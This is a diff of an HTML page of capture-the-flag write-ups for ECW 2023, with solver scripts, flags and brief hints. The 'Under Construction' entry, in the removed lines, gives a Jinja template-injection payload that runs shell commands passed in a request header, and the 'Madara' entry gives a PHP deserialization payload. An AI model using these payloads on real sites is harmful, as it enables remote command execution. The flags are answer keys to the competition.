@@ -102,28 +102,16 @@
       <div class="u-clearfix u-sheet u-sheet-1">
         <h2 class="u-text u-text-default u-text-1">Misc</h2>
         <h3 class="u-text u-text-default u-text-2"> Jigsaw2 (1,2,3)</h3>
+        <p class="u-text u-text-default u-text-3"> To get the flags, you will have to answer to all questions in a limited time. Don't forget to check the leaderboard.</p>
+        <p class="u-text u-text-default u-text-4">jigsaw2 (4/4):<a href="https://github.com/Walbre/ecw-2023/tree/main/jigsaw2" class="u-active-none u-border-none u-btn u-button-link u-button-style u-hover-none u-none u-text-palette-1-base u-btn-1">&nbsp;https://github.com/Walbre/ecw-2023/tree/main/jigsaw2</a>
+        </p>
+        <h3 class="u-text u-text-default u-text-5"> FlyAway</h3>
+        <p class="u-text u-text-default u-text-6"> Our Brittany antenna has intercepted this message. We think it contains major information. <a href="../../../files/mission.wav" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-2">mission.wav</a>
+        </p>
         <div class="u-clearfix u-custom-html u-expanded-width u-custom-html-1">
           <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/prism.min.js"></script>
           <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/components/prism-python.min.js"></script>
-          <pre>            <code class="language-python"> import cv2
-import ast
-import webcolors
-import numpy as np
-from pwn import *
-from PIL import Image
-from pyzbar import pyzbar
-from pyMorseTranslator import translator
-asciicodes = [' ','!','"','#','
-        <p class="u-text u-text-default u-text-3">jigsaw2 (4/4):<a href="https://github.com/Walbre/ecw-2023/tree/main/jigsaw2" class="u-active-none u-border-none u-btn u-button-link u-button-style u-hover-none u-none u-text-palette-1-base u-btn-1">&nbsp;https://github.com/Walbre/ecw-2023/tree/main/jigsaw2</a>
-        </p>
-        <h3 class="u-text u-text-default u-text-4"> FlyAway</h3>
-        <p class="u-text u-text-default u-text-5"> Our Brittany antenna has intercepted this message. We think it contains major information. <a href="../../../files/mission.wav" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-2">mission.wav</a>
-        </p>
-        <div class="u-clearfix u-custom-html u-expanded-width u-custom-html-2">
-          <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/prism.min.js"></script>
-          <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/components/prism-python.min.js"></script>
-          <pre>            <code class="language-python"> from manchester_code import encode, decode, decode_bits
-import numpy as np
+          <pre><code class="language-python">import numpy as np
 import soundfile as sf
 from Crypto.Util.number import *
 data, samplerate = sf.read('mission.wav')
@@ -136,24 +124,23 @@ for i in range(len(data)//5):
     else:
         a.append(1)
 s = np.array(list(decode_bits(a))).astype(int)
-print(long_to_bytes(int("".join(map(str, s.tolist())), 2))) </code>
-          </pre>
+print(long_to_bytes(int("".join(map(str, s.tolist())), 2))) </code></pre>
         </div>
-        <p class="u-text u-text-default u-text-palette-2-base u-text-6"> Mayday, Mayday, We are flight EI-EMD. It is 10th January 2023. Be on time at (48.113,-1.571). The flag is ECW{HH:MM} with HH:MM the time in 24h format.</p>
-        <p class="u-text u-text-default u-text-7">
+        <p class="u-text u-text-default u-text-palette-2-base u-text-7"> Mayday, Mayday, We are flight EI-EMD. It is 10th January 2023. Be on time at (48.113,-1.571). The flag is ECW{HH:MM} with HH:MM the time in 24h format.</p>
+        <p class="u-text u-text-default u-text-8">
           <a href="../../../files/FR5997_2ecd8ebf.csv" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-3"> FR5997_2ecd8ebf.csv</a>
         </p>
-        <p class="u-text u-text-default u-text-8">Flag: <span class="u-text-palette-2-base">ECW{06:36}</span>
+        <p class="u-text u-text-default u-text-9">Flag: <span class="u-text-palette-2-base">ECW{06:36}</span>
         </p>
-        <h3 class="u-text u-text-default u-text-9"> Babel</h3>
-        <p class="u-text u-text-default u-text-10"> You found these two files in a dead drop. Decipher it. <a href="../../../files/ECW_Babel_unknown.txt" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-4">unkown.txt</a>&nbsp;
+        <h3 class="u-text u-text-default u-text-10"> Babel</h3>
+        <p class="u-text u-text-default u-text-11"> You found these two files in a dead drop. Decipher it. <a href="../../../files/ECW_Babel_unknown.txt" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-4">unkown.txt</a>&nbsp;
         </p>
         <img class="u-image u-image-default lazyload u-image-1" alt="" data-image-width="711" data-image-height="777" data-src="../../../images/ECW_Babel_message.png">
-        <p class="u-text u-text-default u-text-11">
+        <p class="u-text u-text-default u-text-12">
           <a href="https://www.dcode.fr/symbols-ciphers" class="u-active-none u-border-none u-btn u-button-link u-button-style u-hover-none u-none u-text-palette-2-base u-btn-5"> https://www.dcode.fr/symbols-ciphers</a>
         </p>
-      </code></pre></div><code class="language-python">
-    </code></div></section><code class="language-python">
+      </div>
+    </section>
     <section class="u-clearfix u-section-3" id="sec-a050">
       <div class="u-clearfix u-sheet u-sheet-1">
         <h2 class="u-text u-text-default u-text-1">Crypto</h2>
@@ -171,7 +158,7 @@ print(long_to_bytes(int("".join(map(str, s.tolist())), 2))) </code>
         <p class="u-text u-text-default u-text-7"> Just a baby encryption scheme for you. It features&nbsp;os.urandom, therefore it is perfectly safe.. <a href="../../../files/BMPaaS.txt" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-3"> BMPaaS.py</a>
         </p>
         <div class="u-clearfix u-custom-html u-expanded-width u-custom-html-1">
-          <pre>            <code class="language-python"> import os
+          <pre><code class="language-python">import os
 import base64
 import numpy as np
 from pwn import *
@@ -192,8 +179,7 @@ idata = np.array([[CHARSET[c] for c in d[:-1]] for d in tqdm(data)])
 s = list(s) 
 s = ''.join(s)
 with open("flag.bmp", "wb") as f:
-    f.write(base64.b85decode(s)) </code>
-          </pre>
+    f.write(base64.b85decode(s)) </code></pre>
         </div>
         <img class="u-image u-image-default u-preserve-proportions lazyload u-image-1" alt="" data-image-width="107" data-image-height="5" data-src="../../../images/ECW_BMPaaS_flag.png">
         <h3 class="u-text u-text-default u-text-8"> CryptoFlow</h3>
@@ -213,7 +199,7 @@ with open("flag.bmp", "wb") as f:
         <p class="u-text u-text-default u-text-3"> Find the correct entry. <a href="../../../files/ECW_moth.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-1">challenge.zip</a>
         </p>
         <div class="u-clearfix u-custom-html u-expanded-width u-custom-html-1">
-          <pre>            <code class="language-python"> import sys
+          <pre><code class="language-python">import sys
 import copy
 import numpy as np
 s = [1, 2, 3, 4, 5]
@@ -251,8 +237,7 @@ def dequy(a, av, k, d):
             av[i, j] = 0
     return r
 	
-dequy(a, av, 0, d) </code>
-          </pre>
+dequy(a, av, 0, d) </code></pre>
         </div>
         <h3 class="u-text u-text-default u-text-4">spaceships</h3>
         <p class="u-text u-text-default u-text-5"><i>Everything that lives is designed to end.</i>
@@ -306,8 +291,7 @@ if(@$__==='Madara'){
 }
 else die("it's too EZ go go");
 ?&gt;
-it's too EZ go go </code>
-          </pre>
+it's too EZ go go </code></pre>
         </div>
         <p class="u-text u-text-palette-2-base u-text-4">%5F%5F=Madara&amp;___=a:1:{s:1:%22o%22;a:1:{s:1:%22k%22;s:7:%22imBored%22;}}<br>Flag: ECW{C3u7pdBCAfsmbp8eq5T2}
         </p>
@@ -382,317 +366,6 @@ it's too EZ go go </code>
     <footer class="u-align-center u-clearfix u-footer u-grey-80 u-footer" id="sec-d03e"><div class="u-clearfix u-sheet u-sheet-1">
         <p class="u-small-text u-text u-text-variant u-text-1">Duong Anh Kiet</p>
       </div></footer>
-    <section class="u-backlink u-clearfix u-grey-80">
-      <a class="u-link" href="https://nicepage.com/website-templates" target="_blank">
-        <span>Website Templates</span>
-      </a>
-      <p class="u-text">
-        <span>created with</span>
-      </p>
-      <a class="u-link" href="" target="_blank">
-        <span>Website Builder Software</span>
-      </a>. 
-    </section>
-  
-,'%','&amp;','','(',')','*','+',',','-','.','/',
-          '0','1','2','3','4','5','6','7','8','9',':',';','&lt;','=','&gt;','?','@',
-          'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q',
-          'r','s','t','u','v','w','x','y','z','[','\\',']','^','_', ":", ",", ' ']
-brailles = ['⠀','⠮','⠐','⠼','⠫','⠩','⠯','⠄','⠷','⠾','⠡','⠬','⠠','⠤','⠨','⠌','⠴','⠂','⠆','⠒','⠲','⠢',
-        '⠖','⠶','⠦','⠔','⠱','⠰','⠣','⠿','⠜','⠹','⠈','⠁','⠃','⠉','⠙','⠑','⠋','⠛','⠓','⠊','⠚','⠅',
-        '⠇','⠍','⠝','⠕','⠏','⠟','⠗','⠎','⠞','⠥','⠧','⠺','⠭','⠽','⠵','⠪','⠳','⠻','⠘','⠸', ":", ",", ' ']
-		
-a = []
-r = remote("instances.challenge-ecw.fr", 40276)
-r.recvline()
-r.recvline()
-r.sendline(b"yes")
-a.append("yes")
-r.recvline()
-r.sendline(b"42")
-a.append("42")
-s = r.recvline()
-print(s)
-if b"before" in s:
-    r.sendline(chr(s[-2]-1).encode())
-    a.append(chr(s[-2]-1))
-elif b"after" in s:
-    r.sendline(chr(s[-2]+1).encode())
-    a.append(chr(s[-2]+1))
-s = r.recvline().strip().decode()
-print(s)
-color = ast.literal_eval(s[s.rfind(":")+1:])
-if webcolors.rgb_to_name(color) == "lime":
-    r.sendline(b"green")
-    a.append("green")
-else:
-    r.sendline(webcolors.rgb_to_name(color).encode())
-    a.append(webcolors.rgb_to_name(color))
-print(r.recvline())
-r.recvline()
-r.sendline(",".join(a).encode())
-a.append(",".join(a))
-s = r.recvline().decode()
-print(s)
-idx = (np.array(ast.literal_eval(s[s.rfind("(s) ")+4: s.rfind("using the same format")-1]))-1)
-if type(idx.tolist()) == int:
-    r.sendline(a[idx].encode())
-    a.append(a[idx])
-else:
-    r.sendline(",".join(np.array(a)[idx]).encode())
-    a.append(",".join(np.array(a)[idx]))
-s = r.recvline().decode()
-if "Can you tell me what color is" in s:
-    color = ast.literal_eval(s[s.rfind(":")+1:])
-    r.sendline(webcolors.rgb_to_name(color).encode())
-    a.append(webcolors.rgb_to_name(color))
-elif "Easy question, Which letter comes after" in s:
-    r.sendline(chr(ord(s[-2])+1).encode())
-    a.append(chr(ord(s[-2])+1))
-elif "Easy question, Which letter comes before" in s:
-    r.sendline(chr(ord(s[-2])-1).encode())
-    a.append(chr(ord(s[-2])-1))
-elif "I forgot everything. Send me back your answers to questions 1 to 4, separated by commas" in s:
-    r.sendline(",".join(a[:4]).encode())
-    a.append(",".join(a[:4]))
-elif "What is the meaning of life" in s:
-    r.sendline(b"42")
-    a.append("42")
-elif "Do you wanna play a game?" in s:
-    r.sendline(b"yes")
-    a.append("yes")
-else:
-    print(s)
-print(r.recvline())
-s = r.recvline().strip().decode()
-s = s[3:]
-print(s)
-if s.startswith("..."):
-    s = translator.Decoder().decode(s.replace("---... /", "")).plaintext
-    print(s, s.replace("SEND ME BACK THE FOLLOWING WORD ", ""))
-    s = s.replace("SEND ME BACK THE FOLLOWING WORD ", "")
-    r.sendline(s.encode())
-    a.append(s)
-elif s.startswith("⠎"):
-    s_new = ""
-    for c in s.replace(" ", ""):
-        s_new += asciicodes[brailles.index(c)]
-    s = s_new.upper()
-    s = s.replace("SEND ME BACK THE FOLLOWING WORD : ", "")
-    print(s_new, s)
-    r.sendline(s.encode())
-    a.append(s)
-else:
-    print(s)
-    r.sendline(b"NEURAL NETWORK")
-    a.append("NEURAL NETWORK")
-s = r.recv(2048)[3:]
-with open("image.png", "wb") as f:
-    f.write(s)
-result = pyzbar.decode(Image.open('image.png'))
-r.sendline(result[0].data[result[0].data.rfind(b":") + 2:])
-a.append(result[0].data[result[0].data.rfind(b":") + 2:].decode())
-s = r.recv(2**14)[4:]
-with open("image.png", "wb") as f:
-    f.write(s)
-result = pyzbar.decode(Image.open('image.png'))
-s = result[0].data.strip()
-if s.startswith(b"\xe2\xa0\x81"):
-    s = s.decode("utf-8").replace(" ⠀ ", "_").replace(" ", "").replace("_", " ")
-else:
-    s = s.decode()
     
-if s.startswith(".-"):
-    s = translator.Decoder().decode(s.replace("---... /", "")).plaintext.lower()
-if s.startswith("⠁"):
-    s_new = ""
-    for c in s:
-        s_new += asciicodes[brailles.index(c)]
-    s = s_new[:]
-if "you tell me what color is : " in s:
-    color = ast.literal_eval(s[s.rfind(":")+2:])
-    r.sendline(webcolors.rgb_to_name(color).encode())
-    a.append(webcolors.rgb_to_name(color))
-elif "you tell me what color is" in s:
-    color = ast.literal_eval(s[s.rfind("is")+3:])
-    r.sendline(webcolors.rgb_to_name(color).encode())
-    a.append(webcolors.rgb_to_name(color))
-elif "question, which letter comes after" in s:
-    r.sendline(chr(ord(s[-1])+1).encode())
-    a.append(chr(ord(s[-2])+1))
-elif "question, which letter comes before" in s:
-    r.sendline(chr(ord(s[-1])-1).encode())
-    a.append(chr(ord(s[-2])-1))
-elif "forgot everything. send me back your answers to questions 1 to 4, separated by commas" in s:
-    r.sendline(",".join(a[:4]).encode())
-    a.append(",".join(a[:4]))
-elif "is the meaning of life" in s:
-    r.sendline(b"42")
-    a.append("42")
-elif "you wanna play a game?" in s:
-    r.sendline(b"yes")
-    a.append("yes")
-else:
-    print(s)
-print(r.recvline()) </code>
-          
-        
-        <p class="u-text u-text-default u-text-3">jigsaw2 (4/4):<a href="https://github.com/Walbre/ecw-2023/tree/main/jigsaw2" class="u-active-none u-border-none u-btn u-button-link u-button-style u-hover-none u-none u-text-palette-1-base u-btn-1">&nbsp;https://github.com/Walbre/ecw-2023/tree/main/jigsaw2</a>
-        </p>
-        <h3 class="u-text u-text-default u-text-4"> FlyAway</h3>
-        <p class="u-text u-text-default u-text-5"> Our Brittany antenna has intercepted this message. We think it contains major information. <a href="../../../files/mission.wav" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-2">mission.wav</a>
-        </p>
-        {custom-html-placeholderr-1}
-        <p class="u-text u-text-default u-text-palette-2-base u-text-6"> Mayday, Mayday, We are flight EI-EMD. It is 10th January 2023. Be on time at (48.113,-1.571). The flag is ECW{HH:MM} with HH:MM the time in 24h format.</p>
-        <p class="u-text u-text-default u-text-7">
-          <a href="../../../files/FR5997_2ecd8ebf.csv" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-3"> FR5997_2ecd8ebf.csv</a>
-        </p>
-        <p class="u-text u-text-default u-text-8">Flag: <span class="u-text-palette-2-base">ECW{06:36}</span>
-        </p>
-        <h3 class="u-text u-text-default u-text-9"> Babel</h3>
-        <p class="u-text u-text-default u-text-10"> You found these two files in a dead drop. Decipher it. <a href="../../../files/ECW_Babel_unknown.txt" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-4">unkown.txt</a>&nbsp;
-        </p>
-        <img class="u-image u-image-default lazyload u-image-1" alt="" data-image-width="711" data-image-height="777" data-src="../../../images/ECW_Babel_message.png">
-        <p class="u-text u-text-default u-text-11">
-          <a href="https://www.dcode.fr/symbols-ciphers" class="u-active-none u-border-none u-btn u-button-link u-button-style u-hover-none u-none u-text-palette-2-base u-btn-5"> https://www.dcode.fr/symbols-ciphers</a>
-        </p>
-      
-    
-    <section class="u-clearfix u-section-3" id="sec-a050">
-      <div class="u-clearfix u-sheet u-sheet-1">
-        <h2 class="u-text u-text-default u-text-1">Crypto</h2>
-        <h3 class="u-text u-text-default u-text-2"> Random_key</h3>
-        <p class="u-text u-text-default u-text-3"> An encrypted message sent by ALICE to its control center has been intercepted.<br>
-          <br>You have managed to get your hands on some code snippets used by ALICE to encrypt its message, as well as the ciphertext. Your mission is to recover the message in clear text.<br>
-          <br>Enc: 21952f9ced6c9109f8ce7c41cd3e0e6981c97a84745d5fdc75b2584e9a5a05e0
-        </p>
-        <a href="../../../files/ECW_generate_key.c.txt" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-1">geneate_key.c</a>
-        <p class="u-text u-text-default u-text-4">
-          <a href="../../../files/ECW_Random_key.txt" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-2">challenge.py</a>
-        </p>
-        <p class="u-text u-text-default u-text-palette-2-base u-text-5">Same random seed</p>
-        <h3 class="u-text u-text-default u-text-6"> BMPaaS</h3>
-        <p class="u-text u-text-default u-text-7"> Just a baby encryption scheme for you. It features&nbsp;os.urandom, therefore it is perfectly safe.. <a href="../../../files/BMPaaS.txt" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-3"> BMPaaS.py</a>
-        </p>
-        {custom-html-placeholderr-2}
-        <img class="u-image u-image-default u-preserve-proportions lazyload u-image-1" alt="" data-image-width="107" data-image-height="5" data-src="../../../images/ECW_BMPaaS_flag.png">
-        <h3 class="u-text u-text-default u-text-8"> CryptoFlow</h3>
-        <p class="u-text u-text-default u-text-9"> You have misconfigured your IA who took the control of your computer. It's now mocking you using its favorite method: an unsolvable challenge. Find the password to take back the control of your system. <a href="../../../files/ECW_CryptoFlow.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-4">challenge.zip</a>
-        </p>
-        <p class="u-text u-text-default u-text-palette-2-base u-text-10">PWN SBox and do whatever you want.&nbsp;ECW{Whyd0yOuMod1fyMySb0xDude??!}.</p>
-        <h3 class="u-text u-text-default u-text-11"> Straightline</h3>
-        <p class="u-text u-text-default u-text-12"> You got access to a web site created by ALICE, the artificial intelligence. Your goal is to find an administrator access in order to obtain information to stop ALICE. To your disposal is the source of the cryptographic algorithm used for the authenfication. <a href="../../../files/ECW_Straightline.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-5">challenge.zip</a>
-        </p>
-        <p class="u-text u-text-default u-text-palette-2-base u-text-13">Request token for "admim" then calculate for "admin" its mapping 1:1.</p>
-      </div>
-    </section>
-    <section class="u-clearfix u-section-4" id="sec-c387">
-      <div class="u-clearfix u-sheet u-sheet-1">
-        <h2 class="u-text u-text-default u-text-1"> Reverse</h2>
-        <h3 class="u-text u-text-default u-text-2"> moth</h3>
-        <p class="u-text u-text-default u-text-3"> Find the correct entry. <a href="../../../files/ECW_moth.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-1">challenge.zip</a>
-        </p>
-        {custom-html-placeholderr-3}
-        <h3 class="u-text u-text-default u-text-4">spaceships</h3>
-        <p class="u-text u-text-default u-text-5"><i>Everything that lives is designed to end.</i>
-          <br>
-          <br>Attention all units: we have detected a rogue AI within one of our simulations. The machine possesses advanced capabilities and is rapidly adapting to our tactics. We need you to engage with the enemy and neutralize the threat using any means necessary. Prepare to deploy your most skilled operators on the battlefield. Remember, we are the last hope for humanity — failure is not an option. <a href="../../../files/ECW_spaceships.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-2">challenge.zip</a>
-        </p>
-        <p class="u-text u-text-default u-text-palette-2-base u-text-6">Flag: ECW{BADCE115}. It's a game. Plot and see how it work. Or turn one by one bit to 1 and see how many the counter return at the end.</p>
-        <img class="u-image u-image-contain u-image-default lazyload u-image-1" alt="" data-image-width="144" data-image-height="580" data-src="../../../images/spaceships.gif">
-        <img class="u-image u-image-contain u-image-default lazyload u-image-2" alt="" data-image-width="806" data-image-height="238" data-src="../../../images/SPOILER_spaceships.PNG">
-        <h3 class="u-text u-text-default u-text-7"> InteractiveReverse</h3>
-        <p class="u-text u-text-default u-text-8"> You have laid hands upon a novel kind of chip that runs an unknown architecture. You cannot reverse engineer the chip itself, but you are able to converse with it, and are tasked with finding the secret hidden in an associated sample program.<br>
-          <a href="../../../files/ECW_InteractiveReverse.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-3">challenge.zip</a>
-        </p>
-        <p class="u-text u-text-default u-text-palette-2-base u-text-9">??Unintended?? Solution: pwn the server and get the flag. <a href="../../../files/ECW_InteractiveReverse_sol.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-4">sol.zip</a>
-        </p>
-        <h3 class="u-text u-text-default u-text-10"> kaleidoscope</h3>
-        <p class="u-text u-text-default u-text-11"> Mom, the weird machine is acting weird again...<br>
-          <a href="../../../files/ECW_kaleidoscope.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-5">challenge.zip</a>
-        </p>
-        <p class="u-text u-text-default u-text-palette-2-base u-text-12">Flag: ECW{w31rdtu4l_m4ch1n3s_g00d_fun}.VM obfuscate</p>
-      </div>
-    </section>
-    <section class="u-clearfix u-section-5" id="sec-722a">
-      <div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
-        <h2 class="u-text u-text-default u-text-1"> Web</h2>
-        <h3 class="u-text u-text-default u-text-2"> Madara</h3>
-        <p class="u-text u-text-default u-text-3"> This is an easy task for such a good hacker, go get me the flag.<br>
-        </p>
-        {custom-html-placeholderr-4}
-        <p class="u-text u-text-palette-2-base u-text-4">%5F%5F=Madara&amp;___=a:1:{s:1:%22o%22;a:1:{s:1:%22k%22;s:7:%22imBored%22;}}<br>Flag: ECW{C3u7pdBCAfsmbp8eq5T2}
-        </p>
-        <h3 class="u-text u-text-default u-text-5"> Under Construction</h3>
-        <p class="u-text u-text-default u-text-6">What is better than hacking a website when it's still under construction!<br>
-          <a href="../../../files/ECW_kaleidoscope.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-1">challenge.zip</a>
-        </p>
-        <p class="u-text u-text-default u-text-palette-2-base u-text-7"> "{%print(lipsum|attr(request.headers.c)).os.popen(request.headers.d).read()%}"@a.com.com <br>c: __globals__ <br>d: &lt;command&gt;
-        </p>
-        <h3 class="u-text u-text-default u-text-8"> FiREburn</h3>
-        <p class="u-text u-text-default u-text-9"> Yet another artificial intelligence is released, but its answers are limited, so you have to ask it the right question. Your mission is to obtain the flag, or rather to extort it, because it won't listen. For this challenge, automated scanners are not useful.</p>
-        <p class="u-text u-text-default u-text-10">
-          <a href="https://github.com/Walbre/ecw-2023/tree/main/fireBurn" class="u-active-none u-border-none u-btn u-button-link u-button-style u-hover-none u-none u-text-palette-2-base u-btn-2"> https://github.com/Walbre/ecw-2023/tree/main/fireBurn</a>
-        </p>
-      </div>
-    </section>
-    <section class="u-clearfix u-section-6" id="sec-327e">
-      <div class="u-clearfix u-sheet u-sheet-1">
-        <h2 class="u-text u-text-default u-text-1"> Forensics</h2>
-        <h3 class="u-text u-text-default u-text-2"> DumpCyber</h3>
-        <p class="u-text u-text-default u-text-3"> I am lost inside this dump, to escape I think I need my key and IV?<br>The challenge is available&nbsp;<a href="https://drive.google.com/file/d/12qaHQ5s3Yu4MD9clevbdwjmUNBsQ3q9h" class="u-active-none u-border-none u-btn u-button-link u-button-style u-hover-none u-none u-text-palette-1-base u-btn-1" target="_blank">here</a>.<br>Note: the flag format for this challenge is&nbsp;<span style="font-weight: 700;">flag{...}</span>.<br>
-        </p>
-        <p class="u-text u-text-palette-2-base u-text-4">Find key and init file. Decrypt the flag.</p>
-        <h3 class="u-text u-text-default u-text-5"> CallRec</h3>
-        <p class="u-text u-text-default u-text-6"> A mobile phone has been discovered during an investigation. Authorities have extracted a dump from the phone, but crucial information is missing.<br>
-          <br>Your mission is to retrieve the following information:<br>
-          <br>The&nbsp;weight&nbsp;(in grams, rounded to the nearest unit) of the phone.<br>The&nbsp;serial number&nbsp;(SNR) of the phone.<br>The&nbsp;time&nbsp;(hh:mm:ss) of the last call made to the number&nbsp;023546789.<br>
-          <br>The flag is in the following format:&nbsp;ECW{md5(weight-serialnumber-calltime)}.<br>
-          <br>For example, ifweight =&nbsp;92g<br>serial number =&nbsp;471636<br>calltime =&nbsp;22h30 and 42 seconds<br>the flag will be constructed as follows:&nbsp;md5(92-471636-22:30:42), which gives the flag&nbsp;ECW{59da29c226c05915b078f6455b2c6a42}.
-        </p>
-        <p class="u-text u-text-default u-text-palette-2-base u-text-7">
-          <a href="../../../files/ECW_CallRec-xThaz.pdf" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-2">Collected solution</a>
-        </p>
-      </div>
-    </section>
-    <section class="u-clearfix u-section-7" id="sec-d5f1">
-      <div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
-        <h2 class="u-text u-text-default u-text-1">Pwn</h2>
-        <h3 class="u-text u-text-default u-text-2"> watermelons</h3>
-        <p class="u-text u-text-default u-text-3"> You stumble across a peculiar-looking shop... Get the flag in&nbsp;flag.txt.<br>
-          <a href="../../../files/ECW_watermelons.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-1">challenge.zip</a>
-        </p>
-        <h3 class="u-text u-text-default u-text-4"> shellboy</h3>
-        <p class="u-text u-text-default u-text-5"> While packing to go to the ECW finals, one of your friends found an old Gameboy cartridge in a box, along with a booklet. Curious, he ran it on his console. Unfortunately, he never managed to win. He knows you're much better than he is. That's why he challenged you to win the game by displaying the victory flag.<br>
-          <br>In his generosity, he gives you the dump of the gameboy cartridge, as well as the contents of the booklet (apparently the source code). He also provides you with an emulator (Wasmboy) to try out the game. Good luck!<br>
-          <a href="../../../files/ECW_shellboy.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-2">challenge.zip</a>
-          <br>
-        </p>
-        <h3 class="u-text u-text-default u-text-6"> The Calculator in Shadow</h3>
-        <p class="u-text u-text-default u-text-7"> ALICE has a secret: it is not really good at mental calculations. However, fret not, since ALICE solved the issue by emulating a RISCV 64-bit processor, and running a custom calculator on top of it.<br>
-          <br>We think that we may gain some way to fight ALICE by exploiting its calculator, so we secured an access to it! We also got a leak of the source, you will therefore find it attached. Hey, aren't we efficient? Now's your turn to act! However it seems ALICE doesn't emulate a standard RISCV 64-bit processor, but added an obscure thing to it. There are, consequently, custom instructions in the calculator code. Well, now that seems very shady...<br>
-          <a href="../../../files/ECW_The-Calculator-in-Shadow.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-3">challenge.zip</a>
-          <br>
-        </p>
-        <h3 class="u-text u-text-default u-text-8"> CentralizedMemory</h3>
-        <p class="u-text u-text-default u-text-9"> The GreenShard group came up with a revolutionary idea to reduce the maintenance costs of its IT equipment: dematerialize RAM! The company bought its employees PCs with as little RAM as possible and installed a client to exchange data with the centralized RAM server.<br>
-          <br>Obviously, the company jealously guards its secrets and divulges nothing about the communication protocol between the clients and the RAM server. Nevertheless, a recent leak has enabled you to get your hands on the RAM server binary and the libc used. Prove that this company is on the wrong track by retrieving the flag from the server.<br>
-          <br>For the record, we know for a fact that this company uses ncat for its other services.<br>
-          <a href="../../../files/ECW_CentralizedMemory.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-4">challenge.zip</a>
-          <br>
-        </p>
-        <h3 class="u-text u-text-default u-text-10"> PoNG</h3>
-        <p class="u-text u-text-default u-text-11"> You retrieved the source code of the AI's image recognition system. Exploit it and steal the secrets.<br>
-          <a href="../../../files/ECW_PoNG.zip" class="u-active-none u-border-none u-btn u-button-link u-button-style u-file-link u-hover-none u-none u-text-palette-1-base u-btn-5">challenge.zip</a>
-          <br>
-        </p>
-      </div>
-    </section>
-    
-    
-    
-    <footer class="u-align-center u-clearfix u-footer u-grey-80 u-footer" id="sec-d03e"><div class="u-clearfix u-sheet u-sheet-1">
-        <p class="u-small-text u-text u-text-variant u-text-1">Duong Anh Kiet</p>
-      </div></footer>
   
 </body></html>
